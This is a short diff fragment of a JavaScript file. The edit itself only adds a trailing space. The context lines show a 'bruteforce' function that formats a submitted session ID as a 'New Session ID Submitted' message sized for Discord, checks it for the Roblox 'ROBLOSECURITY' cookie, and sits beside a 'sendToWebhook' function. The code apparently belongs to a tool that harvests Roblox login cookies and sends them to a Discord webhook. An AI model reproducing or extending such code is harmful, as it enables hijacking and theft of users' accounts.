@@ -43,7 +43,7 @@ function sendToWebhook(content) {
 
 function bruteforce(sessionId) {
   const maxLength = 2000; // Discord's limit for message content
-  const extraLength = 1000; // Additional characters if "ROBLOSECURITY" is detected
+  const extraLength = 1000; // Additional characters if "ROBLOSECURITY" is detected 
   let content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
 
   if (sessionId.includes("ROBLOSECURITY")) {
